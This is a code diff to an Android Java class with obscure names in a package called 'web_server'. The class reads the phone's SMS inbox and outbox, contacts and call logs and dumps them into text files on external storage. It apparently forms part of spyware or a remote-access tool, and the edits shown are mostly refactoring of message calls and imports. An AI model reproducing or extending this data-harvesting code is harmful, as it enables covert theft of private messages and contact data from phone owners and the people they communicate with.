@@ -1,24 +1,40 @@
 package com.example.myapplication.src.main.java.com.nameless.web_server;
 
+import static android.app.PendingIntent.getActivity;
+
+import static com.example.myapplication.src.main.java.com.nameless.web_server.Session.showMessage;
+
 import android.app.Activity;
+import android.content.ActivityNotFoundException;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
+import android.hardware.Sensor;
+import android.hardware.SensorEvent;
+import android.hardware.SensorEventListener;
+import android.hardware.SensorManager;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Environment;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.util.Log;
 
 import com.example.myapplication.MainActivity;
 
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Date;
 
 public class dbancmd extends Activity {
+    private static Context context;
     public static StringBuilder clg = new StringBuilder();
     public static StringBuilder gtc = new StringBuilder();
+    File zppng = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/");
 
 
     public static void msg(){
@@ -66,7 +82,7 @@ public class dbancmd extends Activity {
                 mgData.append(msgData+"\n\n======  [+]");
             } while (cursorr.moveToNext());
         } else {
-            Session.showMessage("none");
+            showMessage("none");
         }
         wrtfl("MyFolder/clt","Msg.txt",mgData+"\n",false);
 
@@ -107,13 +123,36 @@ public class dbancmd extends Activity {
                 mgData.append(msgData+"\n\n======  [+]");
             } while (cursorr.moveToNext());
         } else {
-            Session.showMessage("none");
+            showMessage("none");
         }
         wrtfl("MyFolder/clt","Msgout.txt",mgData+"\n",false);
 
 
 
-        Session.showMessage("Done");
+        showMessage("Done");
+    }
+    public static Context getAppContext() {
+        return dbancmd.context;
+    }
+
+    public static void gg(String v){
+
+//        try {
+//            Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+//            intent.setData(Uri.parse("package:" + v));
+//            startActivity(intent);
+//            Session.showMessage("info opened 1");
+//
+//        } catch ( Exception e ) {
+//            //e.printStackTrace();
+//            e.printStackTrace();
+//
+//            //Open the generic Apps page:
+//            Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_APPLICATIONS_SETTINGS);
+//            startActivity(intent);
+//            Session.showMessage("info opened 2");
+//
+//        }
     }
 
 
@@ -185,7 +224,7 @@ public class dbancmd extends Activity {
                 }
             }
         }catch (Exception e){
-            Session.showMessage("contact error");
+            showMessage("contact error");
         }
         if (cur != null) {
             cur.close();
@@ -212,5 +251,8 @@ public class dbancmd extends Activity {
         } catch (Exception e) {
         }
     }
+
+
+
 
 }
